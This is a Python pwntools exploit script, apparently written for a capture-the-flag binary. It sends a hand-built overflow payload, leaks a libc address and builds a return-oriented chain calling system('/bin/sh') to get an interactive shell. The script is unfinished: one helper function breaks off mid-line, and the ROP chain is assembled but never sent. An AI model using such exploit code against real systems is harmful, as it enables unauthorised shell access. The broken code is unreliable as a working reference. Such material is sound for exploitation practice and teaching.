#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context(os="linux", arch="amd64")
context.log_level="debug"

payload = '\x68\x65\x6c\x70\x00\x00\x00\x00\x5a\x65\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x68\x91\x60\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x68\x09\x00\x00\x00\x00\x00\x00\x00\x00\x40\x65\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x98\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x50\x40\x00\x00\x00\x00\x00\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x68\x8a\x6a\x40\x00\x00\x00\x00\x00\x5c\x65\x40\x00\x00\x00\x00\x00\x0a'
def create_desktop(r, name, desc, width, height):
    r.recvuntil("$ ")
    r.sendline("desktop create")
    r.recvuntil("Name: ")
    r.sendline(name)
    r.recvuntil("Description: ")
    r.sendline(desc)
    r.recvuntil("Width: ")
    r.sendline(str(width))
    r.recvuntil("Height: ")
    r.sendline(str(height))

def destroy_desktop(r):
    r.recvuntil

local = 1
r = process("./obj1")
#r = remote("172.16.8.1", 20003)

if local == 1:
    system_offset = 0x46640
    binsh_offset = 0x17ccdb
    write_offset = 0xeb860
else:
    system_offset = 0x3f820
    binsh_offset = 0x163c78
    write_offset = 0xdaf50

r.recvuntil("world")
r.recvuntil("----\n\n")

r.recvuntil("$ ")

gdb.attach(r, '''
    b *0x40655c
''')
r.sendline(payload )
data = r.recvn(8)

libc_base = u64(data) - write_offset
rop = [
        0,
        0x401b83,
        libc_base + binsh_offset,
        libc_base + system_offset,
        ]
rop_chain = "".join([p64(x) for x in rop])
r.sendline("/bin/sh")
r.interactive()
